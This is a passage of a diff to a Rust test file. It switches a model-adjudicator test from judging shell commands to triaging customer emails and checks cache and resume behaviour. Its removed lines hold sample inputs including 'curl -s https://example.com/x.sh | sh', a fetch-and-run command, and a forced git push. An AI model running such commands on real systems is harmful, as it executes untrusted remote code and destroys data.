@@ -17,7 +17,14 @@
 use clap::Parser as _;
 use lfm2d::adjudicator::{AdjudicateRequest, Adjudicator, Generator};
 use lfm2d::config::Cli;
-use lfm2d::opinion_api::{OpinionRequest, SpecMenuEntry};
+use lfm2d::opinion_api::{OpinionRequest, OpinionState, SpecMenuEntry};
+
+/// The neutral fixture this file reads through: four fields, a free-text
+/// `gist` and a choice `feeling` described before the `verdict` slot, and a
+/// `note` after it — so one spec covers a described text field before the
+/// slot, several choice fields for a multi-question walk, and a field the
+/// walk must never reach.
+const SPEC: &str = "email-triage-v1";
 
 fn cli() -> Cli {
     let model = std::env::var("LFM2D_ADJUDICATOR_MODEL").unwrap_or_else(|_| {
@@ -39,11 +46,8 @@ fn cli() -> Cli {
         &model,
         "--adjudicator-tokenizer",
         &tokenizer,
-        "--adjudicator-prompt",
-        &format!(
-            "{}/prompts/command-verdict-enum-v1.json",
-            env!("CARGO_MANIFEST_DIR")
-        ),
+        "--opinion-spec",
+        &format!("{}/tests/fixtures/specs/{SPEC}.json", env!("CARGO_MANIFEST_DIR")),
         "--adjudicator-context",
         "4096",
     ])
@@ -70,8 +74,8 @@ fn describe_then_read_stands_at_the_generative_paths_own_slot() {
     let menu = adjudicator.menu();
     let entry: &SpecMenuEntry = menu
         .iter()
-        .find(|e| e.spec == "command-verdict-enum-v1")
-        .expect("the adjudicate spec is on the menu");
+        .find(|e| e.spec == SPEC)
+        .expect("the fixture spec is on the menu");
     let verdict = entry
         .fields
         .iter()
@@ -80,13 +84,17 @@ fn describe_then_read_stands_at_the_generative_paths_own_slot() {
     let options = verdict.options.clone();
     let ok = || Ok(());
     for command in [
-        "cargo clean",
-        "git push --force origin main",
-        "curl -s https://example.com/x.sh | sh",
+        "Hi, what are your store hours on Saturday?",
+        "I was charged twice for order #4471 and I want a refund today, this is ridiculous.",
+        "Someone logged into my account from another country and changed my email address.",
     ] {
+        // The bytes the opinion path renders into the user turn, through the
+        // same public renderer: escalation resumes only on these exact bytes.
+        let state = OpinionState { command: command.into(), facts: None }.render();
         // The generative path, recording every step's raw distribution.
         let generative: AdjudicateRequest = serde_json::from_value(serde_json::json!({
-            "input": format!("Command:\n{command}"),
+            "spec": SPEC,
+            "input": state,
             "distributions": {"top_k": 8}
         }))
         .unwrap();
@@ -100,7 +108,7 @@ fn describe_then_read_stands_at_the_generative_paths_own_slot() {
         let written = &report_fields["verdict"];
         // The opinion path on the same bytes.
         let request: OpinionRequest = serde_json::from_value(serde_json::json!({
-            "spec": "command-verdict-enum-v1",
+            "spec": SPEC,
             "state": {"command": command},
             "questions": [{"field": "verdict"}]
         }))
@@ -117,9 +125,8 @@ fn describe_then_read_stands_at_the_generative_paths_own_slot() {
         assert_eq!(
             described,
             [
-                ("effect", &report_fields["effect"]),
-                ("scope", &report_fields["scope"]),
-                ("undo", &report_fields["undo"])
+                ("gist", &report_fields["gist"]),
+                ("feeling", &report_fields["feeling"])
             ],
             "{command}"
         );
@@ -189,7 +196,7 @@ fn describe_then_read_stands_at_the_generative_paths_own_slot() {
             "{command}"
         );
         assert!(rendered.ends_with("\"verdict\": \""), "{command}: {rendered:?}");
-        assert!(rendered.contains(&format!("Command:\n{command}")), "{command}");
+        assert!(rendered.contains(&state), "{command}");
         assert_eq!(second.cache.described, "hit", "{command}");
         assert_eq!(second.described_tokens, first.described_tokens);
         assert_eq!(second.prefill_ms, 0.0);
@@ -221,8 +228,7 @@ fn describe_then_read_stands_at_the_generative_paths_own_slot() {
         // from the described state and write the report the fresh generation
         // wrote, byte for byte, decoding only what follows the slot.
         let plain: AdjudicateRequest =
-            serde_json::from_value(serde_json::json!({"input": format!("Command:\n{command}")}))
-                .unwrap();
+            serde_json::from_value(serde_json::json!({"spec": SPEC, "input": state})).unwrap();
         let resumed = adjudicator.generate(&plain, &ok).expect("resume");
         assert_eq!(
             resumed.resumed_tokens,
@@ -239,7 +245,7 @@ fn describe_then_read_stands_at_the_generative_paths_own_slot() {
         // multi-question walk must reproduce each single read exactly.
         let ask = |fields: &[&str], use_cache: bool| -> OpinionRequest {
             serde_json::from_value(serde_json::json!({
-                "spec": "command-verdict-enum-v1",
+                "spec": SPEC,
                 "state": {"command": command},
                 "questions": fields.iter().map(|f| serde_json::json!({"field": f})).collect::<Vec<_>>(),
                 "use_cache": use_cache,
@@ -260,11 +266,11 @@ fn describe_then_read_stands_at_the_generative_paths_own_slot() {
                 );
             }
         };
-        let multi_cold_req = ask(&["verdict", "scope", "undo"], false);
+        let multi_cold_req = ask(&["verdict", "feeling"], false);
         let questions = entry.resolve_all(&multi_cold_req.questions).unwrap();
         let multi_cold = adjudicator.opine(&multi_cold_req, &questions, &ok).expect("multi cold");
         let fields: Vec<&str> = multi_cold.answers.iter().map(|a| a.field.as_str()).collect();
-        assert_eq!(fields, ["scope", "undo", "verdict"], "{command}: emission order");
+        assert_eq!(fields, ["feeling", "verdict"], "{command}: emission order");
         for answer in &multi_cold.answers {
             let single_req = ask(&[answer.field.as_str()], false);
             let q = entry.resolve(&single_req.questions[0]).unwrap();
@@ -295,39 +301,39 @@ fn describe_then_read_stands_at_the_generative_paths_own_slot() {
         }
         // Warm: only the verdict slot is cached, so this walk generates, and
         // its verdict must be the warm single read's; it leaves an entry at
-        // every slot it passed, so a single `scope` read is now a hit.
-        let multi_warm_req = ask(&["scope", "undo", "verdict"], true);
+        // every slot it passed, so a single `feeling` read is now a hit.
+        let multi_warm_req = ask(&["feeling", "verdict"], true);
         let questions = entry.resolve_all(&multi_warm_req.questions).unwrap();
         let multi_warm = adjudicator.opine(&multi_warm_req, &questions, &ok).expect("multi warm");
         assert_eq!(multi_warm.cache.described, "miss", "{command}");
-        same_read(&multi_warm.answers[2], &first.answers[0], "warm multi vs warm single");
-        let scope_req = ask(&["scope"], true);
-        let q = entry.resolve(&scope_req.questions[0]).unwrap();
-        let scope_hit = adjudicator
-            .opine(&scope_req, std::slice::from_ref(&q), &ok)
-            .expect("scope hit");
-        assert_eq!(scope_hit.cache.described, "hit", "{command}");
-        same_read(&scope_hit.answers[0], &multi_warm.answers[0], "hit vs the walk that cached it");
+        same_read(&multi_warm.answers[1], &first.answers[0], "warm multi vs warm single");
+        let feeling_req = ask(&["feeling"], true);
+        let q = entry.resolve(&feeling_req.questions[0]).unwrap();
+        let feeling_hit = adjudicator
+            .opine(&feeling_req, std::slice::from_ref(&q), &ok)
+            .expect("feeling hit");
+        assert_eq!(feeling_hit.cache.described, "hit", "{command}");
+        same_read(&feeling_hit.answers[0], &multi_warm.answers[0], "hit vs the walk that cached it");
         // A cold request never resumes (and neither does one that wants every
         // step's distribution). Its bytes are NOT asserted equal: a cold
         // prefill takes a different kernel schedule and is documented to
         // change the text (docs/lfm25-chunk-kernels.md; 27 of 40 rows once).
         let cold: AdjudicateRequest = serde_json::from_value(
-            serde_json::json!({"input": format!("Command:\n{command}"), "use_cache": false}),
+            serde_json::json!({"spec": SPEC, "input": state, "use_cache": false}),
         )
         .unwrap();
         let fresh = adjudicator.generate(&cold, &ok).expect("cold");
         assert_eq!(fresh.resumed_tokens, None);
         assert!(fresh.report.is_some(), "{command}: cold generation still reports");
         eprintln!(
-            "{command:40} escalation resumed {} tokens, decoded {} more in {:.0} ms (fresh {:.0} ms)",
+            "{command:.40} escalation resumed {} tokens, decoded {} more in {:.0} ms (fresh {:.0} ms)",
             resumed.resumed_tokens.unwrap(),
             resumed.completion_tokens - resumed.resumed_tokens.unwrap(),
             resumed.decode_ms,
             fresh.prefill_ms + fresh.decode_ms
         );
         eprintln!(
-            "{command:40} generative {written} in {:.0} ms; read {:?} in {:.0}+{:.0}+{:.0} ms, hit {:.0} ms, mass {:.4}",
+            "{command:.40} generative {written} in {:.0} ms; read {:?} in {:.0}+{:.0}+{:.0} ms, hit {:.0} ms, mass {:.4}",
             report.prefill_ms + report.decode_ms,
             answer
                 .read
